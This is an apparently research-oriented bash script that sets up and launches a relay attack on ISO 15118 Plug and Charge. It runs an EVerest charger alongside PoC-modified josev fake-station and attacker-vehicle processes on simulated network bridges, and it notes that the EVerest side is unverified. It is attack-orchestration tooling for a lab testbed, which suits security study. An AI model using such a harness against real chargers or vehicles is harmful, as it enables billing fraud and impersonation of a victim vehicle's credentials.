#!/usr/bin/env bash
# 45-relay-attack-everest.sh - EXPERIMENTAL: run the relay attack with EVerest
# as the honest charging station instead of the unmodified josev SECC.
#
#   br-pnc-a:  EVerest charger (Evse15118D20, config-honest-charger.yaml)
#              attacker vehicle (PoC-modified josev EVCC)
#   br-pnc-b:  fake charging station (PoC-modified josev SECC, secc2 cert)
#              victim vehicle (unmodified josev EVCC)
#
# STATUS: the josev side is identical to the verified topology-A script. The
# EVerest side uses configs/everest/config-honest-charger.yaml, which is NOT
# verified end to end: see the KNOWN LIMITATION comment in that file about
# driving the simulated control pilot without EVerest's internal car. Treat
# this script as the integration harness for that work, and keep
# 40-relay-attack-josev.sh as the fallback that reproduces the attack today.
set -euo pipefail

SCAFFOLD="$(cd "$(dirname "$0")/.." && pwd)"
WORK="${EVEREST_WORK:-$HOME/everest-workspace}"
CONF_SRC="$SCAFFOLD/configs/everest/config-honest-charger.yaml"
CONF_DST="$WORK/EVerest/config/config-testbed-honest-charger.yaml"

echo "== 1/3 Install the charger-only config into the EVerest tree"
cp "$CONF_SRC" "$CONF_DST"
echo "    $CONF_DST"
echo "    Native run:  cd $WORK/build && ./dist/bin/manager --conf $(pwd)/../EVerest/config/config-testbed-honest-charger.yaml"
echo "    Docker run:  rebuild with 10-build-everest-docker.sh CONF_REL=config/config-testbed-honest-charger.yaml"

echo
echo "== 2/3 Start EVerest now (native example):"
echo "    cd $WORK/build && sudo ./dist/bin/manager --conf $CONF_DST"
echo "    Then force the simulated plug-in over MQTT if HLC does not start:"
echo "    (see the KNOWN LIMITATION note in the config file)"
echo
echo "== 3/3 Once EVerest's charger answers SDP on br-pnc-a, run the josev trio:"
echo "    ATTACK honest side = EVerest, so only three josev processes are needed:"
echo "    cd $HOME/pnc-relay"
echo "    NETWORK_INTERFACE=br-pnc-b AUTH_MODES=PNC venv-poc/bin/python -m iso15118.secc.main &   # fake SECC"
echo "    NETWORK_INTERFACE=br-pnc-b EVCC_CONFIG_PATH=honest/evcc_config_pnc.json venv-honest/bin/python iso15118/evcc/main.py &  # victim car"
echo "    NETWORK_INTERFACE=br-pnc-a EVCC_CONFIG_PATH=poc/evcc_config_pnc.json venv-poc/bin/python -m iso15118.evcc.main &        # attacker car"
echo
echo "Success criterion is unchanged: EVerest accepts the relayed signature."
echo "EVerest-side evidence: /tmp/everest-logs (session logging is on in the config)."
